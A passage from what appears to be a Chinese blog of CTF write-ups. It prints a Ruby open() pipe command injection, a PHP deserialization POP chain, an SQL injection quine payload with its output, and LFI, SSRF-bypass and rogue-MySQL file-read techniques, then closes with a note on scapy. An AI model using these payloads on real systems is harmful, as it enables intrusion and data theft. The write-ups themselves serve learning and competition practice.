    <span class="token string">"var img = document.createElement(\"img\");\nimg.src= \"data:image/png;base64,"</span> <span class="token operator">+</span> <span class="token constant">Base64</span><span class="token punctuation">.</span><span class="token function">encode64</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">gsub</span><span class="token punctuation">(</span><span class="token regex">/\s*/</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\";\n"</span>
  <span class="token keyword">rescue</span>
    <span class="token string">'something wrong'</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>
</code></pre>
<p>两个功能，一个上传，一个读取，上传限制了文件后缀是png，并且文件名是他拼拼凑凑算了个MD5，无敌防御。上传功能点没法打<br>读取，读取限制了文件后缀png，不能有<code>..</code>和<code>/</code>，也非常的无敌。但是打肯定只能打这几个地方<br>或者说我觉得唯一可能的点就是open这个函数。一开始在想也没用可能直接发一个软链接文件上去，让他直接读flag然后写进png，再拿出来，但是除了之前有一个往压缩包里打包软链接的操作外，裸的软链接好像并不存在。计划不通</p>
<p>那么去翻文档，结果发现open这个函数能直接执行命令，真是绝了。。。（一开始因为文档是日文的一直不想去看来着<br><a href="https://docs.ruby-lang.org/ja/latest/method/Kernel/m/open.html">ruby open文档</a></p>
<blockquote>
<p>ファイル名 file が ‘|’ で始まる時には続く文字列をコマンドとして起動し、コマンドの標準入出力に対してパイプラインを生成します</p>
</blockquote>
<p>看不懂嗷，谷歌启动，意思就是以文件名<code>|</code>管道符开头的话会把这个当做命令去执行，然后open返回的是这个命令的输入输出流句柄<br>然后强行执行命令，用管道符配base64过<code>/</code>过滤<br><code>file=|echo &quot;Y2F0IC9GTEE5X0t5d1hBdjc4TGJvcGJwQkR1V3NtCiA=&quot;|base64 -d|bash||.png</code></p>
<h2 id="pklovecloud"><a href="#pklovecloud" class="headerlink" title="pklovecloud"></a>pklovecloud</h2><p>垃圾反序列化，出题人必然是知识水平不过关才出的这么个垃圾题</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name">pkshow</span>
<span class="token punctuation">{</span>
    <span class="token keyword">function</span> <span class="token function">echo_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">"Pk very safe^.^"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">acp</span>
<span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$cinder</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$neutron</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$nova</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cinder</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cinder</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cinder</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">echo_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">ace</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$openstack</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$docker</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">echo_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">openstack</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">docker</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">openstack</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">neutron</span> <span class="token operator">=</span> <span class="token variable">$heat</span><span class="token punctuation">;</span>
        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">openstack</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">openstack</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">neutron</span> <span class="token operator">===</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">openstack</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">nova</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">"./{$this->filename}"</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span>
            <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token string">"keystone lost~"</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pks'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$logData</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pks'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token variable">$logData</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span>
<span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token delimiter">?></span>
</code></pre>
<p>我猜这里那个未定义的$heat是放在include的flag.php里面的，但是出题人显然写了些垃圾代码，你在外部定义的变量凭什么能在函数内用呢。我估计本意是想整个引用？以前在哪遇到过一个题就是要序列化一个引用数据来着，反正这里这个变量没用，直接都别管，全部置空就能过（之前做过一个超级解混淆的PHP题，印象里用未定义的变量赋值会直接fatal error退出来着的，不知道为什么这里还能跑下去）</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">acp</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">acp</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">docker</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//echo urlencode(serialize($a));</span>
</code></pre>
<p>即可</p>
<h2 id="EasyCleanup"><a href="#EasyCleanup" class="headerlink" title="EasyCleanup"></a>EasyCleanup</h2><p>确实非常ez，就是不知道为什么有一堆乱七八糟的没用的配置项</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'mode'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'mode'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"eval"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$shell</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'shell'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">'phpinfo();'</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$shell</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">15</span> <span class="token operator">|</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$shell</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token function">checkNums</span><span class="token punctuation">(</span><span class="token variable">$shell</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"hacker"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$shell</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">15</span> <span class="token operator">|</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"hacker"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">:</span> bool<span class="token punctuation">{</span>
    <span class="token variable">$banned</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"while"</span><span class="token punctuation">,</span> <span class="token string">"for"</span><span class="token punctuation">,</span> <span class="token string">"\$_"</span><span class="token punctuation">,</span> <span class="token string">"include"</span><span class="token punctuation">,</span> <span class="token string">"env"</span><span class="token punctuation">,</span> <span class="token string">"require"</span><span class="token punctuation">,</span> <span class="token string">"?"</span><span class="token punctuation">,</span> <span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">"^"</span><span class="token punctuation">,</span> <span class="token string">"+"</span><span class="token punctuation">,</span> <span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">"%"</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">,</span> <span class="token string">"`"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$banned</span> <span class="token keyword">as</span> <span class="token variable">$ban</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">,</span> <span class="token variable">$ban</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> True<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> False<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">checkNums</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">:</span> bool<span class="token punctuation">{</span>
    <span class="token variable">$alphanum</span> <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span><span class="token punctuation">;</span>
    <span class="token variable">$cnt</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$alphanum</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$alphanum</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token variable">$cnt</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$cnt</span> <span class="token operator">></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">return</span> True<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> False<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token delimiter">?></span>
</code></pre>
<p>一个eval功能，一个include功能。给看phpinfo，看了一眼，开了allow_url_include，但是waf过滤了冒号，好像不能用其他协议的话这个配置项也没什么用<br>然后eval还有非常奇怪的长度和字符数量限制。除了执行一下<code>system(&#39;ls&#39;);</code>之外，好像也干不了什么，像直接<code>eval($_GET[1]);</code>这样的，过不了那个<code>$_</code>waf，套一层大括号变成<code>eval($&#123;_GET[1]&#125;);</code>，字符数量超了一个。搞不动这个eval功能有什么用<br>include功能就很实在，只限制了长度15，就当waf的限制就约等于allow_url_include没开<br>本地文件包含的打法也很多，先试了一下才学的的pearcmd，发现register_argc_argv没开，用不了。然后队友提出来一个include自包含崩溃遗留文件，临时文件加路径刚好14个字符，并且还有phpinfo可以看见临时文件名，善。然后找脚本打了几轮打不动<br>最后直接上经典upload_progress，这个时候才发现他把session的auto_clean关了。。。一打就通。傻逼题</p>
<p>这个题存在着多个无效配置和功能，暂且不能猜测出出题人想表达什么，以及出题人的攻击方式是什么样的</p>
<h2 id="yet-another-mysql-injection"><a href="#yet-another-mysql-injection" class="headerlink" title="yet_another_mysql_injection"></a>yet_another_mysql_injection</h2><p>我是SQL注入垃圾，队友把users表翻了一遍没翻到东西，和我说还不知道怎么查别的表，所以我也咕了</p>
<p>翻到了wp，队友那个时候就和我说需要构造一个password，使得查询得到的password和输入的password一致<br>显然我也不会，但是wp提到了，并且这个文章还有点古老<br><a href="https://www.shysecurity.com/post/20140705-SQLi-Quine">SQLi Quine</a><br>利用replace语句套娃，进行替换，使得查询的结果和输入的内容是一致的，这个思路还挺好的，学习了</p>
<p>思路并不复杂，首先要确定一个查询语句<br>因为是构造一个输入和查询结果相等，所以一般来说就直接<code>&#39; union select 1 as password</code>就行</p>
<ol>
<li>第一次替换<br>把用来套娃的语句<code>REPLACE(REPLACE($$,CHAR(34),CHAR(39)),CHAR(36),$$)</code>替换掉自己的查询语句查出的数据，即变为<br><code>&#39; union select REPLACE(REPLACE($$,CHAR(34),CHAR(39)),CHAR(36),$$) as password</code></li>
<li>第二次替换，将上述语句的<code>$$</code>替换成<code>&quot;$&quot;</code>，并把所有单引号转换到双引号<br><code>&quot; union select REPLACE(REPLACE(&quot;$&quot;,CHAR(34),CHAR(39)),CHAR(36),&quot;$&quot;) as password</code></li>
<li>数据填入，把1中得到的语句中的<code>$$</code>替换为用单引号包裹的2中的语句<br><code>&#39; union select REPLACE(REPLACE(&#39;&quot; union select REPLACE(REPLACE(&quot;$&quot;,CHAR(34),CHAR(39)),CHAR(36),&quot;$&quot;) as password&#39;,CHAR(34),CHAR(39)),CHAR(36),&#39;&quot; union select REPLACE(REPLACE(&quot;$&quot;,CHAR(34),CHAR(39)),CHAR(36),&quot;$&quot;) as password&#39;) as password</code></li>
</ol>
<p>成功得到输入和查询结果相同的语句</p>
<pre class=" language-mysql"><code class="language-mysql">mysql> select password from users where username='' union select REPLACE(REPLACE('" union select REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") as password',CHAR(34),CHAR(39)),CHAR(36),'" union select REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") as password') as password;
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| password                                                                                                                                                                                                                                    |
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| ' union select REPLACE(REPLACE('" union select REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") as password',CHAR(34),CHAR(39)),CHAR(36),'" union select REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") as password') as password |
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
</code></pre>
<p>这里在最初的replace模板中就进行了单双引号的修改，所以2中将单引号变为双引号不影响最终结果<br>文章作者还贴了一个简单脚本来产生这类payload</p>
<pre class=" language-python"><code class="language-python">data <span class="token operator">=</span> data<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'$$'</span><span class="token punctuation">,</span><span class="token string">"REPLACE(REPLACE($$,CHAR(34),CHAR(39)),CHAR(36),$$)"</span><span class="token punctuation">)</span>
blob <span class="token operator">=</span> data<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'$$'</span><span class="token punctuation">,</span><span class="token string">'"$"'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">'"'</span><span class="token punctuation">)</span>
data <span class="token operator">=</span> data<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'$$'</span><span class="token punctuation">,</span><span class="token string">"'"</span><span class="token operator">+</span>blob<span class="token operator">+</span><span class="token string">"'"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
</code></pre>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>红明谷&amp;虎符CTF</title>
    <url>/%E7%BA%A2%E6%98%8E%E8%B0%B7&amp;%E8%99%8E%E7%AC%A6.html</url>
    <content><![CDATA[<h1 id="红明谷-amp-虎符CTF"><a href="#红明谷-amp-虎符CTF" class="headerlink" title="红明谷&amp;虎符CTF"></a>红明谷&amp;虎符CTF</h1><p>周末两天两场，被暴打的两天。为什么还是这么弱呢。。。<br>两天上午都在摸鱼，下午的题一个都做不出来，废人</p>
<h2 id="红明谷"><a href="#红明谷" class="headerlink" title="红明谷"></a>红明谷</h2><p>上午摸鱼，听师傅说题目都很简单（虽然可能对我来说不简单），但是他都解决了。所以我就看了下午的这一个题</p>
<h3 id="happysql"><a href="#happysql" class="headerlink" title="happysql"></a>happysql</h3><p>据说是布尔盲注加无information_schema取表名和无列名注入。。。听起来也挺难的，无information_schema用的是<code>mysql.innodb_table_stats</code></p>
<h3 id="writeshell"><a href="#writeshell" class="headerlink" title="writeshell"></a>writeshell</h3><p>没看不知道有哪些过滤，用短标签&lt;?&#x3D;?&gt;替换PHP，反引号执行命令，通配符获取flag</p>
<h3 id="ThinkPHP-3-2-3反序列化"><a href="#ThinkPHP-3-2-3反序列化" class="headerlink" title="ThinkPHP 3.2.3反序列化"></a>ThinkPHP 3.2.3反序列化</h3><p>远古版本的thinkPHP<br>echo了反序列化的数据，那么反序列化的利用点就是<code>__toString</code>或者<code>__destructor</code>，简单的看了一下<code>__toString</code>，完全不可利用，析构函数太多，直接翻到一篇文章<a href="https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA">ThinkPHP v3.2.* （SQL注入&amp;文件读取）反序列化POP链</a>，题目的代码都和这篇文章的测试代码一致。估计是看的这个文章出的了。。<br>thinkphp的SQL功能不是预设定好一个数据库要用的时候直接去查，而是每次可以自己临时创建连接进行交互。这个反序列化能做的事情就是让目标向一个任意数据库发起连接并执行可控的查询语句。<br>具体的pop链就看文章吧，这个师傅也给出了一个对应的payload</p>
<p>乍一听感觉没什么用，因为连接上一个数据库是需要提供数据库名用户名和密码的，我可完全不知道目标机器上的数据库用户名密码是什么，完全打不了</p>
<p>所以这个师傅提出了一个我没见过的操作，恶意SQL服务端。当客户端连上SQL服务端时，服务端可以向客户端要求提供文件，从而做到任意客户端文件读取，而这个操作本身并不需要客户端主动进行文件的提供，服务端可以在任何查询语句后回复文件传输请求，又因为MySQL协议的一个特殊功能是客户端根本不跟踪请求的命令，完全基于服务器响应执行查询。所以当客户端提出了一个正常的查询请求之后，服务端的回复是请求客户端上的文件，客户端也会老老实实的发过去。为此，MYSQL文档中也曾提到客户端不应当连接到不受信任的客户端。<br>tp使用的是MySQL的PDO扩展，默认不允许读取本地文件，但是我们现在完全可控连接时的设置，所以设定MYSQL_ATTR_LOCAL_INFILE为true即可</p>
<p>使用一些现成的工具就能伪造一个SQL服务端，执行任意文件读取<br>抄一个GitHub上的，用python2运行即可</p>
<p>按照上面的文章里读了tp的SQL配置文件，但是SQL配置文件和发的源码是一样的，数据库各项均为空。不知道打哪</p>
<p>直接读flag没读到，读start.sh发现应该是把flag写进了数据库，也暴露了用户名和密码是root&#x2F;root，然后还是连不上去。等wping<br>想用上次比赛的那个很鸡肋的<code>__toString</code>反序列化，惊讶的发现居然这个类不能被序列化和反序列化。怪不得从来没有在原生类利用里看到这种东西过</p>
<h4 id="看wp"><a href="#看wp" class="headerlink" title="看wp"></a>看wp</h4><p>root&#x2F;root没登上去，root&#x2F;123456登上去了，真有你的啊出题人，然后就是正常报错注入了。。</p>
<h2 id="虎符"><a href="#虎符" class="headerlink" title="虎符"></a>虎符</h2><p>也是咕了上午，下午的题也不会做</p>
<h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>最新新闻，这个题看了一下，在留言那里有一堆乱七八糟的过滤但是我还是想不到怎么利用，最后出题人放了hint才知道想表达什么。。。搞心态<br>PHP服务器被日，8.1开发版被提交了一个后门上去，只要UA里字符串以zerodium开头，就把剩下部分走一个eval<br>那么直接走一个eval就行了</p>
<h3 id="unsetme"><a href="#unsetme" class="headerlink" title="unsetme"></a>unsetme</h3><p>也看了一眼，源码也给的极其诡异，猜得出来是一个框架，加上特殊的变量名，很容易搜到是一个叫做fatfree的框架，题目只提供了一个unset功能，下一份源码看，直接搜<code>__unset</code>方法，接受一个key，最后实际调用的是clear方法，clear方法经过了一系列判断之后把传入的key进行一个compile，然后直接拼接字符串放进eval。。。<br>compile写的相当复杂。。但是实际上好像如果我们传入的数据本身就不是什么正常数据的时候并不会发生任何改变。直接进行拼接eval就可以了</p>
<h3 id="慢慢做"><a href="#慢慢做" class="headerlink" title="慢慢做"></a>慢慢做</h3><p>先是一个SQL注入，语句大概意思是<code>SELECT * FROM USERS WHERE password=&#39;md5($password,true) LIMIT 0,1</code>，这是后来hint放出来的。。<br>不然猜这个东西也太离谱了一点，摸出来一个玄幻串<code>129581926211651571912466741651878684928</code>md5之后会出现<code>&#39;or&#39;8</code>这种情况，字符串类型转换成数字且不是0直接万能密码登进去。然后给了一个gopher界面，可以打gopher的内网ssrf，并说ssrf登录admin.php就能获得flag<br>不知道下一步打哪里了。并且gopher感觉好像语法也没问题，写出来为什么一直504Gateway Timeout呢？</p>
<h4 id="看wp-1"><a href="#看wp-1" class="headerlink" title="看wp"></a>看wp</h4><p>由于未知的504错误，打不通。看了别人的wp，就是gopher发POST请求进行堆叠注入，flag在另一个表下，通过rename表的方式查数据<br>（就是那个很经典的强网杯”随便注”）</p>
<h3 id="intarnet"><a href="#intarnet" class="headerlink" title="intarnet"></a>intarnet</h3><p>也是个打内网ssrf的题，用js写的，给了源码<br>第一步登录是超级sha1，要求<code>sha256(sha256(salt + &#39;admin&#39;) + sha256(salt + &#39;admin&#39;)) === sha256(sha256(salt + username) + sha256(salt + password))</code>且不能进这个条件<code>!username || !password || username === password || username.length === password.length || username === &#39;admin&#39;</code><br>令username为数组即可绕过，username[]&#x3D;admin&amp;password&#x3D;admin</p>
<p>第二步是打一个ssrf，有get和post两种方式，post的话完全不可控，感觉无法利用，get的话需要过这么一个waf</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">SSRF_WAF</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> host <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UrlParse</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\[|]/g</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> <span class="token function">isIp</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> IP<span class="token punctuation">.</span><span class="token function">isPublic</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这个地方我真没想到怎么过，一开始都想着去找这些库解析上的漏洞了。。。结果发现这种类型的问题都可以用302重定向解决。。。在这上面栽了两三次了还没长记性呜呜</p>
<p>访问flag路由会得到hint，hint说内网里面还有一个Netflix的什么服务？？不会做</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/3973">通过MySQL LOAD DATA特性来达到任意文件读取</a><br><a href="https://paper.seebug.org/1112/">CSS-T | Mysql Client 任意文件读取攻击链拓展</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>虚拟网络杂谈</title>
    <url>/%E8%99%9A%E6%8B%9F%E7%BD%91%E7%BB%9C%E6%9D%82%E8%B0%88.html</url>
    <content><![CDATA[<h1 id="虚拟网络杂谈"><a href="#虚拟网络杂谈" class="headerlink" title="虚拟网络杂谈"></a>虚拟网络杂谈</h1><p>讲一讲虚拟机，docker之类的各种虚拟网络连接的乱七八糟的东西，还有一些做网安课设时遇到的问题</p>
<h2 id="scapy的使用"><a href="#scapy的使用" class="headerlink" title="scapy的使用"></a>scapy的使用</h2><p>这个算是最简单的点了<br>这个库还挺好用的，可以简单地拼接各层协议，并且自动寻找出口路由选择源IP地址，不清楚各字段的话可以show方法展示一下，然后在挨个print出来就行，比如ICMP的request和reply请求，show的时候显示的是字符串，但是你实际上打印出来会发现确实是一个数字，8代表request，0代表reply</p>
<p>当主机有多个网络出口的时候，这个库能自动的根据设置的dst ip查路由表，然后走对应的网卡出口，并且还能把src ip改成对应出口的ip，Mac地址什么的也不在话下</p>
